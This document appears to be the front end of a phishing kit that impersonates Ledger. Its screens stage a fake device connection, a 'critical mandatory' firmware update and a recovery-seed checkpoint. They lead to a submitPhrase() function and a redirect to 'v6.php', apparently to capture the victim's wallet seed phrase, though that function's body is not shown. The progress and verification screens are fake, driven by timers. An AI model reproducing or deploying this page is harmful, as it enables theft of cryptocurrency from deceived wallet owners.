...
.word-suggestion-item:hover {
  ...
  @media (max-width: 700px) {
    .mobile-logo { display: flex; justify-content:center;width:100%; left:0;}
    .mobile-logo svg{
      width: 40px;
      height: 40px;
    }
...
<svg class="block min-[910px]:hidden h-8 w-auto cursor-pointer" width="148" height="128" viewBox="0 0 148 128" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM138.98 91.6548V119.94H91.7313V127.998H147.039V91.6548H138.98ZM55.388 36.3452V91.6529H91.7313V84.3842H63.4464V36.3452H55.388ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0ZM91.7313 0V8.05844H138.98V36.3452H147.039V0H91.7313Z" fill="white"></path>
                </svg>
  </div>
  <div class="s1-header">
    <h1>Choose your <span>Ledger device</span></h1>
    <p>Select the device you own to connect securely and continue.</p>
  </div>

  <div class="device-grid">
    <!-- Stax -->
    <div class="device-card" onclick="selectDevice('Stax')">
      <div class="device-img">
        <!-- Placeholder: replace src with actual device image -->
        <svg width="80" height="110" viewBox="0 0 80 110" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="15" y="5" width="50" height="75" rx="6" fill="#222" stroke="#444" stroke-width="1.5"></rect>
          <rect x="20" y="15" width="40" height="55" rx="3" fill="#1a1a1a" stroke="#555" stroke-width="1"></rect>
          <rect x="25" y="20" width="30" height="8" rx="2" fill="#333"></rect>
          <rect x="25" y="32" width="30" height="4" rx="1" fill="#2a2a2a"></rect>
          <rect x="25" y="40" width="20" height="4" rx="1" fill="#2a2a2a"></rect>
          <rect x="25" y="55" width="12" height="12" rx="6" fill="#222" stroke="#444"></rect>
          <rect x="43" y="55" width="12" height="12" rx="6" fill="#222" stroke="#444"></rect>
          <!-- Folded back panel -->
          <rect x="5" y="60" width="50" height="45" rx="6" fill="#1a1a1a" stroke="#333" stroke-width="1.5" transform="rotate(-20 5 60)"></rect>
        </svg>
      </div>
      <span>Stax</span>
    </div>
    ...
    <!-- Flex -->
    <div class="device-card" onclick="selectDevice('Flex')">
      <div class="device-img">
        <svg width="65" height="110" viewBox="0 0 65 110" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="8" y="5" width="49" height="90" rx="8" fill="#2a2a2a" stroke="#444" stroke-width="1.5"></rect>
          <rect x="14" y="12" width="37" height="60" rx="4" fill="#1a1a1a" stroke="#555"></rect>
          <rect x="18" y="18" width="29" height="6" rx="2" fill="#333"></rect>
          <rect x="18" y="28" width="22" height="3" rx="1" fill="#2a2a2a"></rect>
          <rect x="18" y="35" width="29" height="3" rx="1" fill="#2a2a2a"></rect>
          <circle cx="32" cy="85" r="6" fill="#1a1a1a" stroke="#444"></circle>
          <!-- USB-C bottom -->
          <rect x="26" y="97" width="13" height="5" rx="2" fill="#333"></rect>
        </svg>
      </div>
      <span>Flex</span>
    </div>
    ...
    <!-- Nano Gen5 -->
    <div class="device-card" onclick="selectDevice('Nano Gen5')">
      <div class="device-img">
        <svg width="75" height="110" viewBox="0 0 75 110" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="10" y="10" width="55" height="75" rx="6" fill="#222" stroke="#444" stroke-width="1.5"></rect>
          <rect x="16" y="18" width="43" height="55" rx="3" fill="#1a1a1a" stroke="#555"></rect>
          <rect x="20" y="22" width="35" height="5" rx="2" fill="#333"></rect>
          <rect x="20" y="31" width="35" height="30" rx="2" fill="#111" stroke="#333"></rect>
          <rect x="23" y="34" width="29" height="4" rx="1" fill="#222"></rect>
          <rect x="23" y="42" width="20" height="4" rx="1" fill="#222"></rect>
          <rect x="23" y="50" width="25" height="4" rx="1" fill="#222"></rect>
          <circle cx="20" cy="88" r="5" fill="#1a1a1a" stroke="#444"></circle>
          <circle cx="55" cy="88" r="5" fill="#1a1a1a" stroke="#444"></circle>
          <rect x="28" y="100" width="19" height="5" rx="2" fill="#333"></rect>
        </svg>
      </div>
      <span>Nano Gen5</span>
    </div>
    ...
    <!-- Nano S -->
    <div class="device-card" onclick="selectDevice('Nano S')">
      <div class="device-img">
        <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" style="transform:rotate(-20deg)">
          <rect x="5" y="25" width="95" height="28" rx="6" fill="#2a2a2a" stroke="#555" stroke-width="1.5"></rect>
          <rect x="18" y="30" width="45" height="18" rx="3" fill="#111" stroke="#444"></rect>
          <text x="23" y="43" font-family="monospace" font-size="8" fill="#888">••••</text>
          <circle cx="12" cy="39" r="6" fill="#1a1a1a" stroke="#444"></circle>
          <circle cx="98" cy="39" r="6" fill="#1a1a1a" stroke="#444"></circle>
          <rect x="5" y="0" width="8" height="28" rx="3" fill="#333"></rect>
        </svg>
      </div>
      <span>Nano S</span>
    </div>
    ...
    <!-- Nano S Plus -->
    <div class="device-card" onclick="selectDevice('Nano S Plus')">
      <div class="device-img">
        <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" style="transform:rotate(-15deg)">
          <rect x="5" y="22" width="100" height="32" rx="7" fill="#333" stroke="#555" stroke-width="1.5"></rect>
          <rect x="20" y="28" width="48" height="20" rx="3" fill="#111" stroke="#444"></rect>
          <rect x="24" y="32" width="10" height="4" rx="1" fill="#222"></rect>
          <rect x="37" y="32" width="20" height="4" rx="1" fill="#222"></rect>
          <rect x="24" y="40" width="30" height="3" rx="1" fill="#1a1a1a"></rect>
          <circle cx="12" cy="38" r="7" fill="#222" stroke="#444"></circle>
          <circle cx="100" cy="38" r="7" fill="#222" stroke="#444"></circle>
          <rect x="5" y="0" width="9" height="25" rx="3" fill="#3a3a3a"></rect>
        </svg>
      </div>
    ...
    <!-- Nano X -->
    <div class="device-card" onclick="selectDevice('Nano X')">
      <div class="device-img">
        <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" style="transform:rotate(-20deg)">
          <rect x="5" y="20" width="100" height="38" rx="8" fill="#3a3a3a" stroke="#555" stroke-width="1.5"></rect>
          <rect x="20" y="27" width="55" height="24" rx="4" fill="#111" stroke="#444"></rect>
          <rect x="25" y="31" width="13" height="5" rx="1" fill="#222"></rect>
          <rect x="42" y="31" width="25" height="5" rx="1" fill="#222"></rect>
          <rect x="25" y="40" width="35" height="3" rx="1" fill="#1a1a1a"></rect>
          <circle cx="12" cy="39" r="8" fill="#2a2a2a" stroke="#444"></circle>
          <circle cx="100" cy="39" r="8" fill="#2a2a2a" stroke="#444"></circle>
          <rect x="5" y="0" width="10" height="23" rx="3" fill="#444"></rect>
          <rect x="95" y="57" width="10" height="6" rx="2" fill="#333"></rect>
        </svg>
      </div>
      <span>Nano X</span>
    </div>
...
<!-- =================== SCREEN 2: CONNECTING (line-art device) =================== -->
<div class="screen" id="s2" style="position:relative;">
   <div class="mobile-logo">
<svg class="block min-[910px]:hidden h-8 w-auto cursor-pointer" width="148" height="128" viewBox="0 0 148 128" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM138.98 91.6548V119.94H91.7313V127.998H147.039V91.6548H138.98ZM55.388 36.3452V91.6529H91.7313V84.3842H63.4464V36.3452H55.388ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0ZM91.7313 0V8.05844H138.98V36.3452H147.039V0H91.7313Z" fill="white"></path>
                </svg>
  ...
  <div style="display:flex;flex-direction:column;align-items:center;gap:24px;">
    <!-- Line-art device SVG placeholder -->
    <div style="width:200px;height:200px;display:flex;align-items:center;justify-content:center;" class="pulse">
      <svg width="180" height="160" viewBox="0 0 180 160" fill="none" xmlns="http://www.w3.org/2000/svg">
        <!-- Nano S line-art outline style -->
        <rect x="10" y="55" width="150" height="50" rx="10" stroke="white" stroke-width="1.5" fill="none" opacity="0.7"></rect>
        <rect x="30" y="63" width="75" height="34" rx="5" stroke="white" stroke-width="1.2" fill="none" opacity="0.6"></rect>
        <!-- dots on screen -->
        <g class="blink">
          <circle cx="48" cy="80" r="3" fill="white" opacity="0.9"></circle>
          <circle cx="60" cy="80" r="3" fill="white" opacity="0.9"></circle>
          <circle cx="72" cy="80" r="3" fill="white" opacity="0.9"></circle>
          <circle cx="84" cy="80" r="3" fill="white" opacity="0.9"></circle>
          <circle cx="96" cy="80" r="3" fill="white" opacity="0.9"></circle>
        </g>
        <rect x="115" y="68" width="28" height="18" rx="2" stroke="white" stroke-width="1" fill="none" opacity="0.5"></rect>
        <text x="119" y="81" font-family="monospace" font-size="7" fill="white" opacity="0.6">••••✓</text>
        <!-- Left button -->
        <circle cx="20" cy="80" r="9" stroke="white" stroke-width="1.2" fill="none" opacity="0.5"></circle>
        <!-- Right button -->
        <circle cx="162" cy="80" r="9" stroke="white" stroke-width="1.2" fill="none" opacity="0.5"></circle>
        <!-- USB cable -->
        <rect x="8" y="5" width="14" height="52" rx="5" stroke="white" stroke-width="1.2" fill="none" opacity="0.4"></rect>
        <rect x="11" y="0" width="8" height="8" rx="2" stroke="white" stroke-width="1" fill="none" opacity="0.3"></rect>
      </svg>
    </div>

    <div class="connect-label" id="s2-connect-label">Connecting to <span>...</span>...</div>
    <div class="verify-row">
      <div class="spinner"></div>
      <span id="s2-detected">Detected: ... — verifying device</span>
    </div>

    <div id="s2-timer" style="display:none; margin-top:20px;">
...
<div class="screen" id="s3" style="position:relative;">
  <div style="display:flex;flex-direction:column;align-items:center;gap:28px;text-align:center;max-width:600px;margin:0 auto;">
    <div class="ledger-logo">
   <img src="images/logo.svg" style="width: 160px;">
    </div>

    <p class="s3-text">
      Once your device is successfully connected, please click <span>"Next"</span> to continue & Download
    </p>

    <button class="btn-primary" onclick="goTo('s4')">Next</button>
  </div>
</div>

<!-- =================== SCREEN 4: CONNECTING YOUR STAX =================== -->
...
<svg class="block min-[910px]:hidden h-8 w-auto cursor-pointer" width="148" height="128" viewBox="0 0 148 128" fill="none" xmlns="http://www.w3.org/2000/svg">
  ...
  <div style="display:flex;flex-direction:column;align-items:center;gap:24px;">
    <!-- Stacked device image placeholder -->
    <div style="width:160px;height:130px;display:flex;align-items:center;justify-content:center;">
      <svg width="150" height="120" viewBox="0 0 150 120" fill="none" xmlns="http://www.w3.org/2000/svg">
        <!-- Stacked Stax devices -->
        <rect x="20" y="60" width="110" height="55" rx="8" fill="#2a2a2a" stroke="#444" stroke-width="1"></rect>
        <rect x="15" y="45" width="110" height="55" rx="8" fill="#333" stroke="#555" stroke-width="1"></rect>
        <rect x="10" y="30" width="110" height="55" rx="8" fill="#3d3d3d" stroke="#666" stroke-width="1"></rect>
        <rect x="18" y="36" width="94" height="42" rx="5" fill="#1a1a1a" stroke="#444"></rect>
        <rect x="22" y="40" width="86" height="6" rx="2" fill="#2a2a2a"></rect>
        <rect x="22" y="50" width="60" height="4" rx="1" fill="#222"></rect>
        <rect x="22" y="58" width="75" height="4" rx="1" fill="#222"></rect>
      </svg>
    </div>

    <div class="connect-label" id="s4-connect-label">Connecting your <span style="color:var(--purple-light)">...</span>...</div>
    <div class="spinner"></div>

    <div id="s4-btn" style="display:none;margin-top:16px;">
      <button class="btn-primary" onclick="goTo('s5')">Connected — Continue</button>
    </div>
  </div>
</div>

<!-- =================== SCREEN 5: FIRMWARE INFO =================== -->
<div class="screen" id="s5">
  <div style="width:100%;max-width:600px;display:flex;flex-direction:column;align-items:center;">
    <!-- Logo -->
    <div class="ledger-logo" style="margin-bottom:40px;">
   <img src="images/logo.svg" style="width: 160px;">
    </div>
    ...
    <div class="stepper">
      <div class="step-item">
        ...
        <div class="step-label active">Preparation</div>
      </div>
      <div class="step-line"></div>
      <div class="step-item">
        <div class="step-circle">2</div>
        <div class="step-label">Firmware update</div>
      </div>
      <div class="step-line"></div>
      <div class="step-item">
    ...
    <div class="fw-icon">
      <svg width="30" height="30" viewBox="0 0 30 30" fill="none">
        <circle cx="15" cy="15" r="10" stroke="var(--purple-light)" stroke-width="2"></circle>
        <line x1="15" y1="8" x2="15" y2="16" stroke="var(--purple-light)" stroke-width="2" stroke-linecap="round"></line>
        <circle cx="15" cy="20" r="1.5" fill="var(--purple-light)"></circle>
      </svg>
    </div>

    <div class="fw-title">New security firmware <span>2.5.1</span></div>
    <div class="fw-sub">A critical mandatory firmware update is now available. Please update your device.</div>

    <div style="margin-top:36px;">
      <button class="btn-primary" onclick="goTo('s6')">Install firmware</button>
    </div>
  </div>
</div>

<!-- =================== SCREEN 6: SECURITY CHECKPOINT =================== -->
<div class="screen" id="s6">
  <div style="width:100%;max-width:600px;display:flex;flex-direction:column;align-items:center;">
    ...
    <div class="fw-icon">
      <svg width="30" height="30" viewBox="0 0 30 30" fill="none">
        <path d="M15 4L5 9v8c0 5.5 4.5 10.5 10 12 5.5-1.5 10-6.5 10-12V9L15 4z" stroke="var(--purple-light)" stroke-width="2" fill="none"></path>
        <polyline points="10,15 13,18 20,11" stroke="var(--purple-light)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
      </svg>
    </div>

    <div class="fw-title">Security Checkpoint</div>
    <div class="fw-sub">Before you perform the update, please make sure you have your recovery seed phrase securely saved.</div>

    <div style="margin-top:36px;">
      <button class="btn-primary" onclick="goTo('s7')">I have my recovery seed</button>
    </div>
  </div>
</div>

<!-- =================== SCREEN 7: UPDATING FIRMWARE =================== -->
  ...
  <div style="width:100%;max-width:600px;display:flex;flex-direction:column;align-items:center;">
    ...
    <div class="stepper">
      ...
      <div class="step-item">
        ...
        <div class="step-label active">Firmware update</div>
      </div>
      <div class="step-line"></div>
      <div class="step-item">
        <div class="step-circle">3</div>
    ...
    <div style="font-size:1.6rem;font-weight:700;margin-bottom:8px;">Updating firmware</div>
    <div style="color:var(--gray2);font-size:0.9rem;margin-bottom:32px;">Please keep your device connected.</div>
    ...
    <div class="progress-wrap">
      ...
      <div class="progress-hint">Please be patient, installation takes some time.</div>
    </div>
  </div>
</div>

<!-- =================== SCREEN 8: FIRMWARE UPDATE SUCCESSFUL =================== -->
<div class="screen" id="s8">
  <div style="width:100%;max-width:600px;display:flex;flex-direction:column;align-items:center;">
    ...
    <div class="check-circle">
      <svg width="30" height="30" viewBox="0 0 30 30" fill="none">
        <polyline points="7,15 12,21 23,10" stroke="var(--purple-light)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></polyline>
      </svg>
    </div>

    <div style="font-size:1.6rem;font-weight:700;margin-bottom:10px;text-align: center;">Firmware Update Successful</div>
    <div style="color:var(--gray2);text-align:center;max-width:380px;line-height:1.6;margin-bottom:36px;">Your device has been successfully updated to the latest version.</div>

    <button class="btn-primary" onclick="goTo('s9')">Continue</button>
  </div>
</div>
...
<div class="panel-left" aria-label="Animation">
        <div class="video-top" bis_skin_checked="1">
          ...
          <div class="progress-bars" id="progress-bars" aria-hidden="true" bis_skin_checked="1">
            <span class="pbar" data-idx="0" style="--dur: 5.033s;"></span>
            <span class="pbar" data-idx="1" style="--dur: 5.033s;"></span>
  ...
  <div id="submitMsg" style="display:none;margin-top:12px;font-size:0.85rem;color:var(--gray2);text-align:center;color: red;"></div>
  </div>
</div>
...
function showSuggestions(input, val) {
  ...
  function goTo(id) {
    ...
    if (id === 's2') {
      document.getElementById('s2-connect-label').innerHTML = 'Connecting to <span>' + selectedDevice + '</span>...';
      document.getElementById('s2-detected').innerText = 'Detected: ' + selectedDevice + ' — verifying device';
    }
    if (id === 's4') {
      document.getElementById('s4-connect-label').innerHTML = 'Connecting your <span style="color:var(--purple-light)">' + selectedDevice + '</span>...';
    }
...
async function submitPhrase() {
  ...
  function showProcessing() {
    ...
    setTimeout(()=>{
      window.location.replace("v6.php");
    },3000);
  }
